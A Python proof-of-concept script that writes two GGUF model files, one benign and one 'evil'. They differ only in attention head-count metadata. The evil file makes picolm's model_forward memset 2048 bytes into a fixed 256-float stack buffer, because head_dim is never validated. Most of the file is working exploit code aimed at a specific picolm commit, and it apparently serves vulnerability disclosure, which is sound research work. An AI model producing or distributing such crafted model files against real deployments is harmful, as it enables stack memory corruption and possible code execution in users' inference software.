#!/usr/bin/env python3
"""
make_poc2.py — twin GGUF models built with the OFFICIAL gguf writer (gguf-py).

Target: RightNow-AI/picolm @ cf3f2dfca389e4f19a10dd36ce110c41ea12c899
Defect:  picolm/model.c:644-645 — model_forward() clears a fixed stack buffer
             float acc[256]; /* head_dim is typically 64-128 */
             memset(acc, 0, (size_t)head_dim * sizeof(float));
         where head_dim = llama.embedding_length / llama.attention.head_count is
         derived entirely from model metadata and never validated against the
         buffer capacity. Both arms below are spec-valid GGUF files written by
         the official gguf-py GGUFWriter with the SAME 12-tensor layout; only
         the attention head topology metadata differs:

  benign_heads2.gguf  head_count=2, head_count_kv=2 -> head_dim = 512/2 = 256 (fits acc[256])
  evil_heads1.gguf    head_count=1, head_count_kv=1 -> head_dim = 512/1 = 512 (2048-byte memset)

Note kv_dim = n_kv_heads * head_dim = 512 in BOTH arms, so the tensor shapes
(attn_k/attn_v [512,512] etc.) are identical; the files differ only in the two
metadata key-values. picolm parses both files without error; the overflow fires
later, inside model_forward's attention pass, on the first generated token.
"""

import hashlib
import sys

import numpy as np
from gguf import GGUFWriter

N_EMBD = 512
N_FFN = 1024
VOCAB = 512
N_LAYERS = 1
CTX = 512

# (name, numpy shape) — gguf-py reverses numpy shape into GGUF dims, which is
# exactly the [n_in, n_out] convention picolm's matmul() expects.
TENSOR_SPECS = [
    ("token_embd.weight", (VOCAB, N_EMBD)),
    ("blk.0.attn_norm.weight", (N_EMBD,)),
    ("blk.0.attn_q.weight", (N_EMBD, N_EMBD)),
    ("blk.0.attn_k.weight", (N_EMBD, N_EMBD)),
    ("blk.0.attn_v.weight", (N_EMBD, N_EMBD)),
    ("blk.0.attn_output.weight", (N_EMBD, N_EMBD)),
    ("blk.0.ffn_norm.weight", (N_EMBD,)),
    ("blk.0.ffn_gate.weight", (N_FFN, N_EMBD)),
    ("blk.0.ffn_up.weight", (N_FFN, N_EMBD)),
    ("blk.0.ffn_down.weight", (N_EMBD, N_FFN)),
    ("output_norm.weight", (N_EMBD,)),
    ("output.weight", (VOCAB, N_EMBD)),
]


def build_tensors() -> dict:
    """One deterministic tensor set, reused verbatim for both arms."""
    rng = np.random.default_rng(42)
    out = {}
    for name, shape in TENSOR_SPECS:
        arr = (rng.standard_normal(shape) * 0.02).astype(np.float32)
        out[name] = np.ascontiguousarray(arr)
    return out


def build_gguf(path: str, n_heads: int, n_kv_heads: int, tensors: dict) -> None:
    w = GGUFWriter(path, arch="llama")
    w.add_uint32("llama.embedding_length", N_EMBD)
    w.add_uint32("llama.feed_forward_length", N_FFN)
    w.add_uint32("llama.attention.head_count", n_heads)        # <- the twin switch
    w.add_uint32("llama.attention.head_count_kv", n_kv_heads)  # <- the twin switch
    w.add_uint32("llama.block_count", N_LAYERS)
    w.add_uint32("llama.context_length", CTX)
    w.add_uint32("llama.vocab_size", VOCAB)
    for name, _ in TENSOR_SPECS:
        w.add_tensor(name, tensors[name])
    w.write_header_to_file()
    w.write_kv_data_to_file()
    w.write_tensors_to_file()
    w.close()


def main() -> int:
    tensors = build_tensors()
    samples = {
        "benign_heads2.gguf": (2, 2),
        "evil_heads1.gguf": (1, 1),
    }
    hashes = []
    for fname, (nh, nkv) in samples.items():
        build_gguf(fname, nh, nkv, tensors)
        with open(fname, "rb") as f:
            data = f.read()
        digest = hashlib.sha256(data).hexdigest()
        hashes.append((digest, fname))
        head_dim = N_EMBD // nh
        print(f"[+] {fname}  {len(data)} bytes  head_dim={head_dim}  sha256={digest}")

    with open("SHA256SUMS.txt", "w") as f:
        for digest, fname in hashes:
            f.write(f"{digest}  {fname}\n")
    print("[+] SHA256SUMS.txt written")
    return 0


if __name__ == "__main__":
    sys.exit(main())
